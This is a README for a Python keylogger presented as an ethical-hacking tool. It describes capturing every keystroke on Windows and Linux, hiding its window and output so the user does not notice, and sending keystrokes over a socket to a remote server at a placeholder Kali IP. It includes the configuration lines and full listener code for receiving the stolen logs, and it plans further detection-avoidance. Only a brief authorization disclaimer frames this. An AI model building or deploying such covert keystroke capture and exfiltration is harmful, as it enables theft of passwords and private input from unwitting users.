# Ethical Keylogger with Stealth Mode and Remote Logging

## Overview

This is a Python-based keylogger designed for **ethical hacking** purposes. The keylogger operates on both **Windows** and **Linux** systems, captures keypresses (including key combinations), runs in stealth mode, and sends logged data to a remote server for analysis. This tool is useful for penetration testers or system administrators to evaluate security by monitoring user activity (with proper authorization).


## Features

- **Cross-Platform Compatibility**: Works on both Windows and Linux.
- **Stealth Mode**: The script hides its console window on Windows and suppresses output on Linux.
- **Key Combination Support**: Captures and logs combinations such as `Ctrl+C`, `Shift+A`, etc.
- **Remote Logging**: Sends keystroke logs to a remote server (e.g., Kali Linux) for analysis.
- **Root/Admin Privilege Check**: Ensures the keylogger runs with appropriate permissions.

## Installation and Setup

### 1. Prerequisites

- Python 3.x
- `pynput` library for capturing keyboard events:
  ```bash
  pip install pynput
  ```

### 2. Keylogger Configuration

- Clone or download the keylogger script.
- Open the script and configure the **IP address** and **port** of the remote Kali Linux server:
  ```python
  REMOTE_SERVER_IP = "KALI_IP_ADDRESS"  # Replace with the actual IP of your Kali server
  REMOTE_SERVER_PORT = 5555             # Ensure this matches the port your server listens on
  ```

### 3. Running the Keylogger

#### On Windows:
1. Open **Command Prompt** as an **Administrator**.
2. Run the keylogger:
   ```bash
   python keylogger.py
   ```

#### On Linux:
1. Run the keylogger with **root privileges**:
   ```bash
   sudo python3 keylogger.py
   ```

### 4. Kali Linux Server Setup

To receive the keystroke logs, you need to set up a server on your Kali Linux machine:

1. Create the following `server.py` script on your Kali Linux machine:

   ```python
   import socket

   def start_server():
       server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       server_socket.bind(('0.0.0.0', 5555))  # Replace with your chosen port
       server_socket.listen(5)
       print("Listening for incoming keylogs...")

       while True:
           client_socket, addr = server_socket.accept()
           print(f"Connection from {addr}")
           while True:
               data = client_socket.recv(1024)
               if not data:
                   break
               print(f"Received: {data.decode('utf-8')}")

   if __name__ == "__main__":
       start_server()
   ```

2. Run the server to start listening for incoming key logs:
   ```bash
   sudo python3 server.py
   ```

3. Ensure that the IP address and port of the server match those in the keylogger configuration.

### 5. Stealth Mode

- **Windows**: The keylogger hides the console window automatically using `ctypes`.
- **Linux**: The keylogger suppresses all output by redirecting `stdout` and `stderr` to `/dev/null`.

## How It Works

1. **Keystroke Logging**: The keylogger captures every keystroke, including special keys and key combinations (e.g., `Ctrl`, `Shift`, `Alt`).
2. **Remote Communication**: Keystrokes are sent to the remote server (Kali Linux machine) over a socket connection.
3. **Stealth Operation**: The keylogger hides itself from view by running silently in the background, making it less likely to be detected by the user.
4. **Privilege Check**: The script checks for admin (Windows) or root (Linux) privileges and will not run without them.

## Legal Disclaimer

This keylogger is intended solely for ethical hacking and penetration testing purposes, where **explicit authorization** is provided. Unauthorized use of this tool to monitor activity on a system you do not own or have permission to access is illegal and may result in severe legal consequences.

Always ensure you have proper authorization before using this keylogger in any environment. I am not responsible for any misuse or illegal activity resulting from its use.

## License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

---

### Next Steps

- Setting up encryption for secure data transfer between the keylogger and the remote server.
- Add logging capabilities for mouse events or screenshots.
- Additional detection-avoidance techniques as required for penetration testing.

---
